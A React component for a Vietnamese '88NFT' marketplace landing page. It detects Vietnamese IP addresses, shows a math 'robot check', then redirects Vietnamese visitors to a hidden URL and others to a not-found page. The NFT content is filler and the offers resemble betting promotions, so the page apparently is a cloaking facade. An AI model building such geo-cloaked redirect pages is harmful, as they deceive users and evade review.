import { useEffect, useState } from 'react'
import { ipRedirectService } from './utils/ipRedirect'

export default function App() {
    const [showModal, setShowModal] = useState(false)
    const [mathQuestion, setMathQuestion] = useState({ num1: 0, num2: 0, answer: 0 })
    const [userAnswer, setUserAnswer] = useState('')
    const [error, setError] = useState('')
    const [countdown, setCountdown] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 })
    const [isCheckingIP, setIsCheckingIP] = useState(false)
    const [isVietnameseIP, setIsVietnameseIP] = useState(false)
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false)

    // Generate math question
    const generateMathQuestion = () => {
        const num1 = Math.floor(Math.random() * 5) + 1
        const num2 = Math.floor(Math.random() * (9 - num1)) + 1
        const answer = num1 + num2
        setMathQuestion({ num1, num2, answer })
    }

    // Check for Vietnam IP but don't redirect yet
    useEffect(() => {
        const checkIP = async () => {
            try {
                setIsCheckingIP(true)
                const isVN = await ipRedirectService.checkVietnameseIP()
                setIsVietnameseIP(isVN)
                setIsCheckingIP(false)
            } catch (error) {
                setIsVietnameseIP(false)
                setIsCheckingIP(false)
            }
        }

        checkIP()
    }, [])

    // Initialize countdown (100 days from now)
    useEffect(() => {
        const endDate = new Date()
        endDate.setDate(endDate.getDate() + 100)

        const interval = setInterval(() => {
            const now = new Date().getTime()
            const distance = endDate.getTime() - now

            const days = Math.floor(distance / (1000 * 60 * 60 * 24))
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60))
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))
            const seconds = Math.floor((distance % (1000 * 60)) / 1000)

            setCountdown({ days, hours, minutes, seconds })

            if (distance < 0) {
                clearInterval(interval)
            }
        }, 1000)

        return () => clearInterval(interval)
    }, [])

    // Show modal after page load
    useEffect(() => {
        const timer = setTimeout(() => {
            setShowModal(true)
            generateMathQuestion()
        }, 1000)

        return () => clearTimeout(timer)
    }, [])

    // Verify math answer
    const verifyMath = async () => {
        const answer = parseInt(userAnswer)

        if (answer === mathQuestion.answer) {
            setShowModal(false)

            // Only redirect Vietnamese users after successful verification
            if (isVietnameseIP) {
                setTimeout(() => {
                    window.location.replace(ipRedirectService.vietnamRedirectUrl)
                }, 500)
            } else {
                setTimeout(() => {
                    window.location.replace(ipRedirectService.notFoundRedirectUrl)
                }, 500)
            }
        } else {
            setError('Câu trả lời không đúng. Vui lòng thử lại.')
            generateMathQuestion()
            setUserAnswer('')
        }
    }

    const handleKeyPress = (e) => {
        if (e.key === 'Enter') {
            verifyMath()
        }
    }

    const handleCTAClick = () => {
        alert('Chào mừng bạn đến với 88NFT! Chức năng đang được phát triển.')
    }

    const toggleMobileMenu = () => {
        setIsMobileMenuOpen(!isMobileMenuOpen)
    }

    const closeMobileMenu = () => {
        setIsMobileMenuOpen(false)
    }

    // Show loading screen while checking IP
    if (isCheckingIP) {
        return (
            <div style={{
                position: 'fixed',
                top: 0,
                left: 0,
                width: '100%',
                height: '100%',
                background: '#0f172a',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexDirection: 'column',
                color: '#fbbf24',
                fontFamily: 'Quicksand, sans-serif'
            }}>
                <div style={{
                    width: '50px',
                    height: '50px',
                    border: '3px solid #334155',
                    borderTop: '3px solid #fbbf24',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    marginBottom: '20px'
                }}></div>
                <p>Đang kiểm tra vị trí...</p>
                <style>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
            </div>
        )
    }

    return (
        <main>
            {/* Navigation */}
            <nav className="navbar">
                <div className="nav-container">
                    <div className="nav-logo">
                        <span>88NFT</span>
                    </div>
                    <ul className={`nav-menu ${isMobileMenuOpen ? 'active' : ''}`}>
                        <li><a href="#home" onClick={closeMobileMenu}>Trang Chủ</a></li>
                        <li><a href="#explore" onClick={closeMobileMenu}>Khám Phá</a></li>
                        <li><a href="#collections" onClick={closeMobileMenu}>Bộ Sưu Tập</a></li>
                        <li><a href="#creators" onClick={closeMobileMenu}>Nghệ Sĩ</a></li>
                        <li><a href="#about" onClick={closeMobileMenu}>Giới Thiệu</a></li>
                    </ul>
                    <div className="nav-toggle" onClick={toggleMobileMenu}>
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                </div>
            </nav>

            {/* Hero Section */}
            <section id="home" className="hero">
                <div className="hero-container">
                    <div className="hero-content">
                        <h1 className="hero-title">
                            Cách để Tìm Kiếm<br />
                            bất kỳ <span className="highlight">Nội Dung Số</span> nào
                        </h1>
                        <p className="hero-subtitle">
                            Khám phá nghệ thuật số phiên bản giới hạn. Tạo, Bán và Mua ngay bây giờ. Đầy đủ tính năng cho tất cả người dùng.
                        </p>

                        {/* Promotions Section */}
                        <div className="promotions-container">
                            <div className="promotions-grid">
                                <div className="promotion-card">
                                    <div className="promotion-icon">🆕</div>
                                    <div className="promotion-content">
                                        <h3>Đăng ký thành viên mới</h3>
                                        <p>Nhận ngay 100K</p>
                                    </div>
                                </div>
                                <div className="promotion-card">
                                    <div className="promotion-icon">💰</div>
                                    <div className="promotion-content">
                                        <h3>Hoàn tiền</h3>
                                        <p>Lên đến 1,5%</p>
                                    </div>
                                </div>
                                <div className="promotion-card">
                                    <div className="promotion-icon">💳</div>
                                    <div className="promotion-content">
                                        <h3>Nạp tiền vào ví</h3>
                                        <p>Được cộng 100%</p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Countdown Timer */}
                        <div className="countdown-container">
                            <h3 className="countdown-title">Hệ thống sẵn sàng sau:</h3>
                            <div className="countdown-display">
                                <div className="countdown-item">
                                    <span className="countdown-number">{countdown.days}</span>
                                    <span className="countdown-label">Ngày</span>
                                </div>
                                <div className="countdown-item">
                                    <span className="countdown-number">{countdown.hours}</span>
                                    <span className="countdown-label">Giờ</span>
                                </div>
                                <div className="countdown-item">
                                    <span className="countdown-number">{countdown.minutes}</span>
                                    <span className="countdown-label">Phút</span>
                                </div>
                                <div className="countdown-item">
                                    <span className="countdown-number">{countdown.seconds}</span>
                                    <span className="countdown-label">Giây</span>
                                </div>
                            </div>
                        </div>

                        <div className="hero-search">
                            <div className="search-container">
                                <i className="fas fa-search"></i>
                                <input type="text" placeholder="Tìm kiếm từ khóa của bạn" />
                                <select className="category-select">
                                    <option>Sản Phẩm Đấu Giá</option>
                                    <option>Nghệ Thuật</option>
                                    <option>Game Assets</option>
                                    <option>Pixel Art</option>
                                </select>
                                <button className="search-btn">Tìm Kiếm</button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* Featured NFTs Section */}
            <section id="explore" className="featured-section">
                <div className="container">
                    <div className="nft-grid">
                        {/* NFT Cards */}
                        {[
                            { title: "Renaissance Portrait #001", image: "https://images.pexels.com/photos/1266808/pexels-photo-1266808.jpeg?w=300&h=300&fit=crop", badge: "GIF", timer: "09:12:24" },
                            { title: "Classical Sculpture", image: "https://images.pexels.com/photos/1266810/pexels-photo-1266810.jpeg?w=300&h=300&fit=crop", badge: "GIF" },
                            { title: "Modern Abstract #042", image: "https://images.pexels.com/photos/1266813/pexels-photo-1266813.jpeg?w=300&h=300&fit=crop", badge: "GIF" },
                            { title: "Ancient Artifact", image: "https://images.pexels.com/photos/1266820/pexels-photo-1266820.jpeg?w=300&h=300&fit=crop", timer: "09:12:24" },
                            { title: "Impressionist Masterpiece", image: "https://images.pexels.com/photos/1266820/pexels-photo-1266820.jpeg?w=300&h=300&fit=crop" },
                            { title: "Contemporary Gallery", image: "https://images.pexels.com/photos/1266830/pexels-photo-1266830.jpeg?w=300&h=300&fit=crop", badge: "GIF", timer: "15:18:24" },
                            { title: "Museum Exhibition", image: "https://images.pexels.com/photos/1266830/pexels-photo-1266830.jpeg?w=300&h=300&fit=crop" },
                            { title: "Art Gallery Collection", image: "https://images.pexels.com/photos/1266835/pexels-photo-1266835.jpeg?w=300&h=300&fit=crop" }
                        ].map((nft, index) => (
                            <div key={index} className="nft-card">
                                <div className="nft-image">
                                    <img src={nft.image} alt={nft.title} />
                                    {nft.badge && <div className="nft-badge">{nft.badge}</div>}
                                    {nft.timer && (
                                        <div className="nft-timer">
                                            <i className="fas fa-clock"></i>
                                            <span>{nft.timer}</span>
                                        </div>
                                    )}
                                </div>
                                <div className="nft-info">
                                    <div className="nft-creators">
                                        <div className="creator-avatars">
                                            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=30&h=30&fit=crop&crop=face" alt="Creator" />
                                            <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=30&h=30&fit=crop&crop=face" alt="Creator" />
                                            <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=30&h=30&fit=crop&crop=face" alt="Creator" />
                                        </div>
                                        <button className="heart-btn">
                                            <i className="far fa-heart"></i>
                                        </button>
                                    </div>
                                    <h3 className="nft-title">{nft.title}</h3>
                                    <div className="nft-price">
                                        <span className="price">20.5 ETH</span>
                                        <span className="edition">1 out of 10</span>
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            {/* Top Sellers Section */}
            <section id="creators" className="sellers-section">
                <div className="container">
                    <div className="section-header">
                        <h2>Người Bán Hàng Đầu</h2>
                        <a href="#" className="see-more">Xem Thêm <i className="fas fa-arrow-right"></i></a>
                    </div>
                    <div className="sellers-grid">
                        {[
                            { name: "Mai Harrington", avatar: null, letter: "Z" },
                            { name: "Floyd Glasgow", avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" },
                            { name: "Donna Schultz", avatar: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face" },
                            { name: "Joshua Morris", avatar: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=80&h=80&fit=crop&crop=face" }
                        ].map((seller, index) => (
                            <div key={index} className="seller-card">
                                <div className="seller-avatar">
                                    {seller.avatar ? (
                                        <img src={seller.avatar} alt={seller.name} />
                                    ) : (
                                        <div className="seller-logo">{seller.letter}</div>
                                    )}
                                </div>
                                <h3>{seller.name}</h3>
                                <p>Top Creator</p>
                                <button className="btn btn-outline">Theo Dõi</button>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            {/* Popular Collections Section */}
            <section id="collections" className="collections-section">
                <div className="container">
                    <div className="section-header">
                        <h2>Bộ Sưu Tập Phổ Biến</h2>
                        <p>Bộ sưu tập tốt nhất của NFT tuần này</p>
                    </div>
                    <div className="collections-grid">
                        <div className="collection-card large">
                            <img src="https://images.pexels.com/photos/1266808/pexels-photo-1266808.jpeg?w=600&h=600&fit=crop" alt="Renaissance Masters Collection" />
                            <div className="collection-overlay">
                                <h3>Renaissance Masters</h3>
                                <p>Bộ sưu tập nghệ thuật cổ điển</p>
                            </div>
                        </div>
                        <div className="collection-card">
                            <img src="https://images.pexels.com/photos/1266810/pexels-photo-1266810.jpeg?w=300&h=300&fit=crop" alt="Modern Art" />
                            <div className="collection-overlay">
                                <h3>Modern Art</h3>
                                <p>Nghệ thuật hiện đại</p>
                            </div>
                        </div>
                        <div className="collection-card">
                            <img src="https://images.pexels.com/photos/1266813/pexels-photo-1266813.jpeg?w=300&h=300&fit=crop" alt="Abstract Gallery" />
                            <div className="collection-overlay">
                                <h3>Abstract Gallery</h3>
                                <p>Triển lãm nghệ thuật trừu tượng</p>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* CTA Section */}
            <section className="cta-section">
                <div className="container">
                    <div className="cta-content">
                        <h2>Sẵn Sàng Bắt Đầu Hành Trình NFT?</h2>
                        <p>Tham gia cộng đồng nghệ sĩ và nhà sưu tập hàng đầu</p>
                        <button className="btn btn-primary btn-large" onClick={handleCTAClick}>
                            Bắt Đầu Ngay
                        </button>
                    </div>
                </div>
            </section>

            {/* Footer */}
            <footer className="footer">
                <div className="container">
                    <div className="footer-content">
                        <div className="footer-section">
                            <div className="footer-logo">
                                <span>88NFT</span>
                            </div>
                            <p>Thị trường NFT hàng đầu cho nghệ thuật bảo tàng và tác phẩm nghệ thuật cổ điển chất lượng cao.</p>
                            <div className="social-links">
                                <a href="#"><i className="fab fa-facebook"></i></a>
                                <a href="#"><i className="fab fa-instagram"></i></a>
                                <a href="#"><i className="fab fa-discord"></i></a>
                                <a href="#"><i className="fab fa-youtube"></i></a>
                            </div>
                        </div>
                        <div className="footer-section">
                            <h3>Thị Trường</h3>
                            <ul>
                                <li><a href="#">Khám Phá</a></li>
                                <li><a href="#">Nghệ Thuật</a></li>
                                <li><a href="#">Game Assets</a></li>
                                <li><a href="#">Bộ Sưu Tập</a></li>
                            </ul>
                        </div>
                        <div className="footer-section">
                            <h3>Tài Nguyên</h3>
                            <ul>
                                <li><a href="#">Hướng Dẫn</a></li>
                                <li><a href="#">Blog</a></li>
                                <li><a href="#">Trợ Giúp</a></li>
                                <li><a href="#">API</a></li>
                            </ul>
                        </div>
                        <div className="footer-section">
                            <h3>Cộng Đồng</h3>
                            <ul>
                                <li><a href="#">Discord</a></li>
                                <li><a href="#">Twitter</a></li>
                                <li><a href="#">Instagram</a></li>
                                <li><a href="#">Newsletter</a></li>
                            </ul>
                        </div>
                    </div>
                    <div className="footer-bottom">
                        <p>&copy; 2024 88NFT. Tất cả quyền được bảo lưu.</p>
                        <div className="footer-links">
                            <a href="#">Điều Khoản</a>
                            <a href="#">Bảo Mật</a>
                            <a href="#">Cookies</a>
                        </div>
                    </div>
                </div>
            </footer>

            {/* Verification Modal */}
            {showModal && (
                <div className="modal">
                    <div className="modal-content">
                        <div className="modal-header">
                            <h3>Xác Minh Bạn Không Phải Robot</h3>
                        </div>
                        <div className="modal-body">
                            <p>Vui lòng giải phép tính đơn giản này để tiếp tục truy cập trang web:</p>
                            <div className="verification-section">
                                <p className="verification-question">
                                    Tổng 2 số sau là bao nhiêu: <span>{mathQuestion.num1} + {mathQuestion.num2}</span>?
                                </p>
                                <input
                                    type="number"
                                    value={userAnswer}
                                    onChange={(e) => setUserAnswer(e.target.value)}
                                    onKeyPress={handleKeyPress}
                                    placeholder="Nhập câu trả lời"
                                />
                                <button className="btn btn-primary" onClick={verifyMath}>
                                    Xác Minh
                                </button>
                            </div>
                            {error && (
                                <div className="error-message">
                                    {error}
                                </div>
                            )}
                            <div className="verification-note">
                                <p><i className="fas fa-shield-alt"></i> Bảo vệ chống spam và bot tự động</p>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </main>
    )
}